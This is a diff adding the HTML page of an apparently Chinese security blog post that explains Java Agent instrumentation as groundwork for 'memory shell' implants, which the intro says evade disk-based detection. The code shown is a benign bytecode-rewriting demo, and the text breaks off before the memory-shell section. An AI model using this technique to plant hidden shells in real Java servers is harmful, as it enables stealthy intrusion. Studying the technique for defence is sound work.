@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言Java Agent是Java虚拟机提供的一种机制，允许在程序运行时动态地修改或增强Java应用程序的行为，通常使用Java Instrumentation API实现，可以在Java应用程序启动时通过命令行参数或其他方式加载。 将Java Agent与内存马结合使用，可以实现一种比传统的内存马更难以检测和防御的攻击方式。攻击者可以编写一个Java Agent程序，利用Java Instrum">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MemoryShell Of Agent">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="前言Java Agent是Java虚拟机提供的一种机制，允许在程序运行时动态地修改或增强Java应用程序的行为，通常使用Java Instrumentation API实现，可以在Java应用程序启动时通过命令行参数或其他方式加载。 将Java Agent与内存马结合使用，可以实现一种比传统的内存马更难以检测和防御的攻击方式。攻击者可以编写一个Java Agent程序，利用Java Instrum">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713618829182-838aab21-7859-4114-8316-34534f5a9612.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713620377436-534821e2-d495-49b0-b154-f180abab1881.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713674825207-ccef9d57-2fa2-440b-871a-7081af687b44.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713678222311-396fbea3-3a28-40f4-8c03-7245d3551d0b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713749172778-13323227-71fd-4db3-8f87-d995c8569929.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713750379102-886c7ab5-3604-456f-86ca-3218aef5231c.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713772672628-3c77b64c-f2f0-47b7-b9ce-14d7e779c847.png">
+<meta property="article:published_time" content="2024-05-19T16:55:00.000Z">
+<meta property="article:modified_time" content="2024-10-18T07:32:23.250Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="Agent">
+<meta property="article:tag" content="MemoryShell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713618829182-838aab21-7859-4114-8316-34534f5a9612.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>MemoryShell Of Agent</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/10/17/%E5%B7%A7%E7%94%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%9B%9E%E6%98%BESSTI%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/05/19/Spring-WebFlux/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&text=MemoryShell Of Agent"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=MemoryShell Of Agent"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MemoryShell Of Agent&body=Check out this article: https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=MemoryShell Of Agent"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&name=MemoryShell Of Agent&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&t=MemoryShell Of Agent"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Agent"><span class="toc-number">2.</span> <span class="toc-text">Java Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E6%97%B6"><span class="toc-number">2.1.</span> <span class="toc-text">启动时</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">基础概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.1.2.</span> <span class="toc-text">测试示例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%97%B6"><span class="toc-number">2.2.</span> <span class="toc-text">运行时</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">基础概述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%A4%BA%E4%BE%8B-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">测试示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">3.</span> <span class="toc-text">Java Agent内存马</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        MemoryShell Of Agent
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-19T16:55:00.000Z" class="dt-published" itemprop="datePublished">2024-05-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Agent/" rel="tag">Agent</a>, <a class="p-category" href="/tags/MemoryShell/" rel="tag">MemoryShell</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java Agent是Java虚拟机提供的一种机制，允许在程序运行时动态地修改或增强Java应用程序的行为，通常使用Java Instrumentation API实现，可以在Java应用程序启动时通过命令行参数或其他方式加载。</p>
+<p>将Java Agent与内存马结合使用，可以实现一种比传统的内存马更难以检测和防御的攻击方式。攻击者可以编写一个Java Agent程序，利用Java Instrumentation API动态地修改Java应用程序的字节码，将恶意代码插入到应用程序中，并在应用程序运行时执行恶意代码。由于恶意代码直接在内存中执行，不会在磁盘上留下痕迹，因此很难被传统的防御机制检测和防御。</p>
+<h2 id="Java-Agent"><a href="#Java-Agent" class="headerlink" title="Java Agent"></a>Java Agent</h2><p>Java Agent简单来说就是JVM提供的一种动态Hook字节码的技术，通过Instrumentation（Java Agent API），开发者能够以一种无侵入的方式，在JVM加载某个class之前修改其字节码的内容，同时也支持重加载已经被加载过的class。</p>
+<p>Java Agent目前有两种使用方式：</p>
+<ul>
+<li>通过-javaagent参数指定agent，从而在JVM启动之前修改class内容（自JDK 1.5开始）</li>
+<li>通过VirtualMachine#attach方法，将agent附加在启动后的JVM进程中，进而动态修改class内容（自JDK 1.6开始）</li>
+</ul>
+<p>两种方式分别需要实现premain和agentmain方法，而这些方法又有如下四种签名，其中带有Instrumentation inst参数的方法优先级更高，会优先被调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs)</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动时"><a href="#启动时" class="headerlink" title="启动时"></a>启动时</h3><h4 id="基础概述"><a href="#基础概述" class="headerlink" title="基础概述"></a>基础概述</h4><p>启动Java程序的时候，利用Java Agent需要添加-javaagent或-agentpath&#x2F;-agentlib（JVMTI的实现方式）参数，Java规定Java Agent程序必须要打包成jar格式并且需要利用MANIFEST.MF文件来配置Java Agent相关参数。同时，jar包中的MANIFEST.MF文件必须指定Premain-Class项，Premain-Class指定的那个类必须实现premain方法。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: com.example.AgentMemoryShell</span><br><span class="line">Premain-Class: com.example.AgentMemoryShell</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>premain方法会在执行main方法前调用，在运行main方法前会去加载-javaagent指定的jar包里面的Premain-Class类中的premain方法。</p>
+<p>工作原理：使用addTransformer方法注册了一个自定义的Transformer类到Java Agent，当有新类被JVM加载时，JVM会自动回调调用自定义Transformer类中的transform方法，传入该类的transform信息（类名、类加载器、类字节码等），并且可以根据传入的类信息决定是否需要修改类字节码，Java Agent修改完字节码后会将新的类字节码返回给JVM，JVM验证类和相应的修改是否合法，当符合类加载要求时，JVM会加载修改后的类字节码。</p>
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713618829182-838aab21-7859-4114-8316-34534f5a9612.png" alt="image.png"></p>
+<p>Instrumentation接口，提供用于监测运行在JVM中的Java API：</p>
+<ul>
+<li>addTransformer&#x2F;removeTransformer，添加或删除ClassFileTransformer</li>
+<li>getAllLoadedClasses，获取所有JVM加载的类</li>
+<li>redefineClasses，重新定义已经加载类的字节码</li>
+<li>setNativeMethodPrefix，动态设置JNI前缀，可以实现Hook Native方法</li>
+<li>retransformClasses，重新加载已经被JVM加载过的类的字节码</li>
+</ul>
+<p>ClassFileTransformer接口是一个转换类文件的代理接口，可以在获取到Instrumentation对象后通过addTransformer方法添加自定义类文件转换器。</p>
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713620377436-534821e2-d495-49b0-b154-f180abab1881.png" alt="image.png"></p>
+<h4 id="测试示例"><a href="#测试示例" class="headerlink" title="测试示例"></a>测试示例</h4><ul>
+<li>创建Test测试类</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String output;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">(String output)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.output = output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Print</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Test Class, output is &quot;</span> + output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>(<span class="string">&quot;H3rmesk1r&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSON(test));</span><br><span class="line">        System.out.println(test.Print());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建MySelfAgent类，重写premain方法</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfAgent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;MySelfAgent start...&quot;</span>);</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">MySelfTransformer</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建MySelfTransformer类，重写transform方法，利用javassist对Test类进行修改</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javaagent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MySelfTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">if</span> (className.equals(<span class="string">&quot;Test&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                classPool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 增加一个String类型的属性input</span></span><br><span class="line">                <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;input&quot;</span>, ctClass);</span><br><span class="line">                <span class="comment">// 设置属性为private</span></span><br><span class="line">                ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">                <span class="comment">// 增加属性到类中, 并设置默认值</span></span><br><span class="line">                ctClass.addField(ctField, CtField.Initializer.constant(<span class="string">&quot;javaagent&quot;</span>));</span><br><span class="line">                <span class="comment">// 增加GET/SET方法</span></span><br><span class="line">                ctClass.addMethod(CtNewMethod.setter(<span class="string">&quot;setInput&quot;</span>, ctField));</span><br><span class="line">                ctClass.addMethod(CtNewMethod.getter(<span class="string">&quot;getInput&quot;</span>, ctField));</span><br><span class="line">                <span class="comment">// 重写Print方法</span></span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">toString</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;Print&quot;</span>);</span><br><span class="line">                toString.setBody(<span class="string">&quot;return \&quot;Test Class, input is \&quot; + input + \&quot;, output is \&quot; + output;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>配置MANIFEST.MF文件</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: javaagent.TestAgent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/Users/alphag0/Desktop/Code/Java/AgentMemoryShell/out/artifacts/AgentMemoryShell_jar/AgentMemoryShell.jar -jar /Users/alphag0/Desktop/Code/Java/Test/out/artifacts/Test_jar/Test.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713674825207-ccef9d57-2fa2-440b-871a-7081af687b44.png" alt="image.png"></p>
+<h3 id="运行时"><a href="#运行时" class="headerlink" title="运行时"></a>运行时</h3><h4 id="基础概述-1"><a href="#基础概述-1" class="headerlink" title="基础概述"></a>基础概述</h4><p>JDK1.6后，增加了agentmain方法，可以在main方法后执行，此时便可以在程序运行时，利用Agent技术来达成一些目的，运行时Agent技术主要依靠VirtualMachine类和VirtualMachineDescriptor类。</p>
+<p>VirtualMachine类：</p>
+<ul>
+<li>attach，可以通过attach方法传入一个JVM的PID，远程连接到JVM上</li>
+<li>loadAgent，向JVM注册一个代理程序Agent，在该Agent的代理程序中会得到一个Instrumentation实例，该实例可以在class加载前改变class的字节码，也可以在class加载后重新加载，在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理</li>
+<li>detach，解出attach建立的连接</li>
+</ul>
+<p>VirtualMachineDescriptor类是用于描述Java虚拟机的容器类，它封装了一个标识目标虚拟机的标识符，以及一个AttachProvider在尝试连接到虚拟机时应该使用的引用。</p>
+<p>VirtualMachineDescriptor实例通过调用VirtualMachine#list方法创建，返回描述所有已安装Java虚拟机的完整描述符列表attach providers。</p>
+<p>工作原理：VirtualMachine类的attach方法，可以attach到一个运行中的java进程上，之后便可以通过loadAgent方法来将agent的jar包注入到对应的进程，注入后，对应进程会调用agentmain方法。</p>
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713678222311-396fbea3-3a28-40f4-8c03-7245d3551d0b.png" alt="image.png"></p>
+<p>对于已加载的类，需要调用retransformClass函数，然后由redefineClasses函数读取已加载的字节码文件后重新加载指定类的字节码。</p>
+<p><img src="/2024/05/20/Agent%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/1713749172778-13323227-71fd-4db3-8f87-d995c8569929.png" alt="image.png"></p>
+<p>但是使用redefineClasses时存在一些限制：</p>
+<ul>
+<li>继承相同的父类</li>
+<li>实现相同的接口</li>
+<li>字段数和字段名要一致，不支持在重新加载时添加或者删除字段</li>
+<li>新增或删除的方法必须是private static&#x2F;final修饰的</li>
+<li>可以修改方法实现</li>
+</ul>
+<h4 id="测试示例-1"><a href="#测试示例-1" class="headerlink" title="测试示例"></a>测试示例</h4><ul>
+<li>创建测试类Test</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFlag</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (flag == <span class="string">&quot;true&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkFlag()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;running true...&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span 